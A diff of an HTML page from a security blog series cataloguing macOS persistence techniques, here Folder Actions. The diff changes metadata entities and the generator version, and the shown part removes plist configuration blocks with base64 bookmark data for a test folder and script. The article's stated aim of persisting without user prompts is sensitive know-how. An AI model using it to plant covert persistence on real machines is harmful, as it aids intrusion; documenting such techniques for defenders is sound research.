@@ -11,11 +11,11 @@
 
     <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Beyond the good ol&#39; LaunchAgents - 24 - Folder Actions"/>
-<meta name="twitter:description" content="This is part 24 in the series of &ldquo;Beyond the good ol&#39; LaunchAgents&rdquo;, where I try to collect various persistence techniques for macOS. For more background check the introduction.
+<meta name="twitter:description" content="This is part 24 in the series of &ldquo;Beyond the good ol&rsquo; LaunchAgents&rdquo;, where I try to collect various persistence techniques for macOS. For more background check the introduction.
  Folder action persistence has been documented by Cody Thomas back in 2019 in his blog. I think he did an awesome job, and everything he wrote still applies today. I wanted to take it a bit further and see if I can persist without any user prompts, and it turned out it is possible."/>
 
     <meta property="og:title" content="Beyond the good ol&#39; LaunchAgents - 24 - Folder Actions" />
-<meta property="og:description" content="This is part 24 in the series of &ldquo;Beyond the good ol&#39; LaunchAgents&rdquo;, where I try to collect various persistence techniques for macOS. For more background check the introduction.
+<meta property="og:description" content="This is part 24 in the series of &ldquo;Beyond the good ol&rsquo; LaunchAgents&rdquo;, where I try to collect various persistence techniques for macOS. For more background check the introduction.
  Folder action persistence has been documented by Cody Thomas back in 2019 in his blog. I think he did an awesome job, and everything he wrote still applies today. I wanted to take it a bit further and see if I can persist without any user prompts, and it turned out it is possible." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://theevilbit.github.io/beyond/beyond_0024/" /><meta property="article:section" content="beyond" />
@@ -56,7 +56,7 @@
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.92.1" />
+    <meta name="generator" content="Hugo 0.96.0" />
   </head>
 
   <body class=" ">
@@ -142,7 +142,7 @@
 
       <div>
         <blockquote>
-<p>This is part 24 in the series of &ldquo;Beyond the good ol' LaunchAgents&rdquo;, where I try to collect various persistence techniques for macOS. For more background check the <a href="https://theevilbit.github.io/beyond/beyond_intro/">introduction</a>.</p>
+<p>This is part 24 in the series of &ldquo;Beyond the good ol&rsquo; LaunchAgents&rdquo;, where I try to collect various persistence techniques for macOS. For more background check the <a href="https://theevilbit.github.io/beyond/beyond_intro/">introduction</a>.</p>
 </blockquote>
 <p>Folder action persistence has been documented by <a href="https://twitter.com/its_a_feature_">Cody Thomas</a> back in 2019 <a href="https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d">in his blog</a>. I think he did an awesome job, and everything he wrote still applies today. I wanted to take it a bit further and see if I can persist without any user prompts, and it turned out it is possible. I will also talk about its TCC implications.</p>
 <h2 id="the-tldr">The TL;DR</h2>
@@ -151,281 +151,281 @@
 <h2 id="creating-folder-actions">Creating Folder Actions</h2>
 <p>As described by Cody the default location for the scripts is <code>/Library/Scripts/Folder Action Scripts</code> and <code>~/Library/Scripts/Folder Action Scripts</code>. The other important item he described is that the action script configuration can be found in the file <code>~/Library/Preferences/com.apple.FolderActionsDispatcher.plist</code>. This PLIST contains even more embedded PLISTs in base64 encoded format.</p>
 <p>Let&rsquo;s start by creating a Folder Action through the GUI, for a folder <code>~/test</code> and attach the script <code>~/Library/Scripts/Folder Action Scripts/folderaction.scpt</code>. This is what we get as a result.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
-<span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
-<span style="color:#309;font-weight:bold">&lt;plist</span> <span style="color:#309">version=</span><span style="color:#c30">&#34;1.0&#34;</span><span style="color:#309;font-weight:bold">&gt;</span>
-<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>folderActions<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-	<span style="color:#309;font-weight:bold">&lt;data&gt;</span>
-	YnBsaXN0MDDUAQIDBAUGBwpYJHZlcnNpb25ZJGFyY2hpdmVyVCR0b3BYJG9iamVjdHMS
-	AAGGoF8QD05TS2V5ZWRBcmNoaXZlctEICVRyb290gAGuCwwSHh8gISQrLzQ1NjpVJG51
-	bGzSDQ4PEVpOUy5vYmplY3RzViRjbGFzc6EQgAKAB9YTFBUWFw4YGRobHB1YYm9va21h
-	cmtXZW5hYmxlZF1wcmlvckNvbnRlbnRzVG5hbWVXc2NyaXB0c4ADgAWABoAEgAiADU8R
-	A2Bib29rYAMAAAAABBAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQ
-	AgAABAAAAAMDAAAAAgAABQAAAAEBAABVc2VycwAAAAUAAAABAQAAY3NhYnkAAAAEAAAA
-	AQEAAHRlc3QMAAAAAQYAABAAAAAgAAAAMAAAAAgAAAAEAwAAQ10AAAMAAAAIAAAABAMA
-	AE2ZAAADAAAACAAAAAQDAACpGgYAAwAAAAwAAAABBgAAUAAAAGAAAABwAAAACAAAAAAE
-	AABBw6vM+VIwNxgAAAABAgAAAgAAAAAAAAAPAAAAAAAAAAAAAAAAAAAACAAAAAQDAAAB
-	AAAAAAAAAAQAAAADAwAA9QEAAAgAAAABCQAAZmlsZTovLy8MAAAAAQEAAE1hY2ludG9z
-	aCBIRAgAAAAEAwAAAJAvUAkAAAAIAAAAAAQAAEHDjpDvAAAAJAAAAAEBAAAwQTgxRjNC
-	MS01MUQ5LTMzMzUtQjNFMy0xNjlDMzY0MDM2MEQYAAAAAQIAAIEAAAABAAAA7xMAAAEA
-	AAAAAAAAAAAAAAEAAAABAQAALwAAAAAAAAABBQAAwwAAAAECAAA0MmMxMGVlZjZiNTNi
-	ZTcwMWI2NjZhMTM4M2E3YmQwMWQ1YjE4NzA0ODUxMzRhMDViMDFhZTU2YzYyOTcwZTkw
-	OzAwOzAwMDAwMDAwOzAwMDAwMDAwOzAwMDAwMDAwOzAwMDAwMDAwMDAwMDAwMjA7Y29t
-	LmFwcGxlLmFwcC1zYW5kYm94LnJlYWQtd3JpdGU7MDE7MDEwMDAwMDY7MDAwMDAwMDMw
-	MDA2MWFhOTswMTsvdXNlcnMvY3NhYnkvdGVzdAAA2AAAAP7///8BAAAAAAAAABEAAAAE
-	EAAAPAAAAAAAAAAFEAAAgAAAAAAAAAAQEAAApAAAAAAAAABAEAAAlAAAAAAAAAACIAAA
-	cAEAAAAAAAAFIAAA4AAAAAAAAAAQIAAA8AAAAAAAAAARIAAAJAEAAAAAAAASIAAABAEA
-	AAAAAAATIAAAFAEAAAAAAAAgIAAAUAEAAAAAAAAwIAAAfAEAAAAAAAABwAAAxAAAAAAA
-	AAARwAAAIAAAAAAAAAASwAAA1AAAAAAAAAAQ0AAABAAAAAAAAACA8AAAhAEAAAAAAABU
-	dGVzdAnSDQ4iEaCAB9IlJicoWiRjbGFzc25hbWVYJGNsYXNzZXNeTlNNdXRhYmxlQXJy
-	YXmjJykqV05TQXJyYXlYTlNPYmplY3TSDQ4sEaEtgAmAB9QTFBYOMBkyM4AKgAWAC4AM
-	TxEELGJvb2ssBAAAAAAEEDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-	ABwDAAAEAAAAAwMAAAACAAAFAAAAAQEAAFVzZXJzAAAABQAAAAEBAABjc2FieQAAAAcA
-	AAABAQAATGlicmFyeQAHAAAAAQEAAFNjcmlwdHMAFQAAAAEBAABGb2xkZXIgQWN0aW9u
-	IFNjcmlwdHMAAAARAAAAAQEAAGZvbGRlcmFjdGlvbi5zY3B0AAAAGAAAAAEGAAAQAAAA
-	IAAAADAAAABAAAAAUAAAAHAAAAAIAAAABAMAAENdAAADAAAACAAAAAQDAABNmQAAAwAA
-	AAgAAAAEAwAAVZkAAAMAAAAIAAAABAMAAJ8dBgADAAAACAAAAAQDAACgHQYAAwAAAAgA
-	AAAEAwAArR0GAAMAAAAYAAAAAQYAAKwAAAC8AAAAzAAAANwAAADsAAAA/AAAAAgAAAAA
-	BAAAQcOrziIIAWgYAAAAAQIAAAEAAAAAAAAADwAAAAAAAAAAAAAAAAAAAAgAAAAEAwAA
-	BAAAAAAAAAAEAAAAAwMAAPUBAAAIAAAAAQkAAGZpbGU6Ly8vDAAAAAEBAABNYWNpbnRv
-	c2ggSEQIAAAABAMAAACQL1AJAAAACAAAAAAEAABBw46Q7wAAACQAAAABAQAAMEE4MUYz
-	QjEtNTFEOS0zMzM1LUIzRTMtMTY5QzM2NDAzNjBEGAAAAAECAACBAAAAAQAAAO8TAAAB
-	AAAAAAAAAAAAAAABAAAAAQEAAC8AAAAAAAAAAQUAAPYAAAABAgAAMDk0YmQ1NjJiMGUw
-	MmFkNmQ5ODg3YTY3YWRkYTA0YzRlNzg0ZWViNGZiYWE1MjhkYzA0M2Y4YTU0OGU3NTA0
-	MjswMDswMDAwMDAwMDswMDAwMDAwMDswMDAwMDAwMDswMDAwMDAwMDAwMDAwMDIwO2Nv
-	bS5hcHBsZS5hcHAtc2FuZGJveC5yZWFkLXdyaXRlOzAxOzAxMDAwMDA2OzAwMDAwMDAz
-	MDAwNjFkYWQ7MDE7L3VzZXJzL2NzYWJ5L2xpYnJhcnkvc2NyaXB0cy9mb2xkZXIgYWN0
-	aW9uIHNjcmlwdHMvZm9sZGVyYWN0aW9uLnNjcHQAAADYAAAA/v///wEAAAAAAAAAEQAA
-	AAQQAACMAAAAAAAAAAUQAAAMAQAAAAAAABAQAAA8AQAAAAAAAEAQAAAsAQAAAAAAAAIg
-	AAAIAgAAAAAAAAUgAAB4AQAAAAAAABAgAACIAQAAAAAAABEgAAC8AQAAAAAAABIgAACc
-	AQAAAAAAABMgAACsAQAAAAAAACAgAADoAQAAAAAAADAgAAAUAgAAAAAAAAHAAABcAQAA
-	AAAAABHAAAAgAAAAAAAAABLAAABsAQAAAAAAABDQAAAEAAAAAAAAAIDwAAAcAgAAAAAA
-	AF8QEWZvbGRlcmFjdGlvbi5zY3B00iUmNzheSW50ZXJuYWxTY3JpcHSiOSpeSW50ZXJu
-	YWxTY3JpcHTSJSY7PF8QFEludGVybmFsRm9sZGVyQWN0aW9uoj0qXxAUSW50ZXJuYWxG
-	b2xkZXJBY3Rpb24ACAARABoAJAApADIANwBJAEwAUQBTAGIAaABtAHgAfwCBAIMAhQCS
-	AJsAowCxALYAvgDAAMIAxADGAMgAygQuBDMENAQ5BDoEPARBBEwEVQRkBGgEcAR5BH4E
-	gASCBIQEjQSPBJEEkwSVCMUI2QjeCO0I8Aj/CQQJGwkeAAAAAAAAAgEAAAAAAAAAPgAA
-	AAAAAAAAAAAAAAAACTU=
-	<span style="color:#309;font-weight:bold">&lt;/data&gt;</span>
-	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>folderActionsEnabled<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-	<span style="color:#309;font-weight:bold">&lt;true/&gt;</span>
-<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-<span style="color:#309;font-weight:bold">&lt;/plist&gt;</span>
-</code></pre></div><p>This is not too informative. We can decode the base64 data, and get a binary plist. If we convert it to XML we get the following.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
-<span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
-<span style="color:#309;font-weight:bold">&lt;plist</span> <span style="color:#309">version=</span><span style="color:#c30">&#34;1.0&#34;</span><span style="color:#309;font-weight:bold">&gt;</span>
-<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$archiver<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-	<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSKeyedArchiver<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
-	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$objects<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-	<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;string&gt;</span>$null<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$class<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>7<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>NS.objects<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-					<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-					<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>2<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$class<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>13<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>bookmark<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>3<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>enabled<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>5<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>name<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>4<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>priorContents<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>6<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>scripts<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>8<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;data&gt;</span>
-		Ym9va2ADAAAAAAQQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-		AAAAUAIAAAQAAAADAwAAAAIAAAUAAAABAQAAVXNlcnMAAAAFAAAAAQEAAGNz
-		YWJ5AAAABAAAAAEBAAB0ZXN0DAAAAAEGAAAQAAAAIAAAADAAAAAIAAAABAMA
-		AENdAAADAAAACAAAAAQDAABNmQAAAwAAAAgAAAAEAwAAqRoGAAMAAAAMAAAA
-		AQYAAFAAAABgAAAAcAAAAAgAAAAABAAAQcOrzPlSMDcYAAAAAQIAAAIAAAAA
-		AAAADwAAAAAAAAAAAAAAAAAAAAgAAAAEAwAAAQAAAAAAAAAEAAAAAwMAAPUB
-		AAAIAAAAAQkAAGZpbGU6Ly8vDAAAAAEBAABNYWNpbnRvc2ggSEQIAAAABAMA
-		AACQL1AJAAAACAAAAAAEAABBw46Q7wAAACQAAAABAQAAMEE4MUYzQjEtNTFE
-		OS0zMzM1LUIzRTMtMTY5QzM2NDAzNjBEGAAAAAECAACBAAAAAQAAAO8TAAAB
-		AAAAAAAAAAAAAAABAAAAAQEAAC8AAAAAAAAAAQUAAMMAAAABAgAANDJjMTBl
-		ZWY2YjUzYmU3MDFiNjY2YTEzODNhN2JkMDFkNWIxODcwNDg1MTM0YTA1YjAx
-		YWU1NmM2Mjk3MGU5MDswMDswMDAwMDAwMDswMDAwMDAwMDswMDAwMDAwMDsw
-		MDAwMDAwMDAwMDAwMDIwO2NvbS5hcHBsZS5hcHAtc2FuZGJveC5yZWFkLXdy
-		aXRlOzAxOzAxMDAwMDA2OzAwMDAwMDAzMDAwNjFhYTk7MDE7L3VzZXJzL2Nz
-		YWJ5L3Rlc3QAANgAAAD+////AQAAAAAAAAARAAAABBAAADwAAAAAAAAABRAA
-		AIAAAAAAAAAAEBAAAKQAAAAAAAAAQBAAAJQAAAAAAAAAAiAAAHABAAAAAAAA
-		BSAAAOAAAAAAAAAAECAAAPAAAAAAAAAAESAAACQBAAAAAAAAEiAAAAQBAAAA
-		AAAAEyAAABQBAAAAAAAAICAAAFABAAAAAAAAMCAAAHwBAAAAAAAAAcAAAMQA
-		AAAAAAAAEcAAACAAAAAAAAAAEsAAANQAAAAAAAAAENAAAAQAAAAAAAAAgPAA
-		AIQBAAAAAAAA
-		<span style="color:#309;font-weight:bold">&lt;/data&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;string&gt;</span>test<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;true/&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$class<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>7<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>NS.objects<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;array/&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classes<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSMutableArray<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSArray<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSObject<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classname<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSMutableArray<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$class<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>7<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>NS.objects<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-					<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-					<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>9<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$class<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>12<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>bookmark<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>10<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>enabled<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>5<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>name<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>11<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;data&gt;</span>
-		Ym9vaywEAAAAAAQQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-		AAAAHAMAAAQAAAADAwAAAAIAAAUAAAABAQAAVXNlcnMAAAAFAAAAAQEAAGNz
-		YWJ5AAAABwAAAAEBAABMaWJyYXJ5AAcAAAABAQAAU2NyaXB0cwAVAAAAAQEA
-		AEZvbGRlciBBY3Rpb24gU2NyaXB0cwAAABEAAAABAQAAZm9sZGVyYWN0aW9u
-		LnNjcHQAAAAYAAAAAQYAABAAAAAgAAAAMAAAAEAAAABQAAAAcAAAAAgAAAAE
-		AwAAQ10AAAMAAAAIAAAABAMAAE2ZAAADAAAACAAAAAQDAABVmQAAAwAAAAgA
-		AAAEAwAAnx0GAAMAAAAIAAAABAMAAKAdBgADAAAACAAAAAQDAACtHQYAAwAA
-		ABgAAAABBgAArAAAALwAAADMAAAA3AAAAOwAAAD8AAAACAAAAAAEAABBw6vO
-		IggBaBgAAAABAgAAAQAAAAAAAAAPAAAAAAAAAAAAAAAAAAAACAAAAAQDAAAE
-		AAAAAAAAAAQAAAADAwAA9QEAAAgAAAABCQAAZmlsZTovLy8MAAAAAQEAAE1h
-		Y2ludG9zaCBIRAgAAAAEAwAAAJAvUAkAAAAIAAAAAAQAAEHDjpDvAAAAJAAA
-		AAEBAAAwQTgxRjNCMS01MUQ5LTMzMzUtQjNFMy0xNjlDMzY0MDM2MEQYAAAA
-		AQIAAIEAAAABAAAA7xMAAAEAAAAAAAAAAAAAAAEAAAABAQAALwAAAAAAAAAB
-		BQAA9gAAAAECAAAwOTRiZDU2MmIwZTAyYWQ2ZDk4ODdhNjdhZGRhMDRjNGU3
-		ODRlZWI0ZmJhYTUyOGRjMDQzZjhhNTQ4ZTc1MDQyOzAwOzAwMDAwMDAwOzAw
-		MDAwMDAwOzAwMDAwMDAwOzAwMDAwMDAwMDAwMDAwMjA7Y29tLmFwcGxlLmFw
-		cC1zYW5kYm94LnJlYWQtd3JpdGU7MDE7MDEwMDAwMDY7MDAwMDAwMDMwMDA2
-		MWRhZDswMTsvdXNlcnMvY3NhYnkvbGlicmFyeS9zY3JpcHRzL2ZvbGRlciBh
-		Y3Rpb24gc2NyaXB0cy9mb2xkZXJhY3Rpb24uc2NwdAAAANgAAAD+////AQAA
-		AAAAAAARAAAABBAAAIwAAAAAAAAABRAAAAwBAAAAAAAAEBAAADwBAAAAAAAA
-		QBAAACwBAAAAAAAAAiAAAAgCAAAAAAAABSAAAHgBAAAAAAAAECAAAIgBAAAA
-		AAAAESAAALwBAAAAAAAAEiAAAJwBAAAAAAAAEyAAAKwBAAAAAAAAICAAAOgB
-		AAAAAAAAMCAAABQCAAAAAAAAAcAAAFwBAAAAAAAAEcAAACAAAAAAAAAAEsAA
-		AGwBAAAAAAAAENAAAAQAAAAAAAAAgPAAABwCAAAAAAAA
-		<span style="color:#309;font-weight:bold">&lt;/data&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;string&gt;</span>folderaction.scpt<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classes<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>InternalScript<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSObject<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classname<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;string&gt;</span>InternalScript<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classes<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
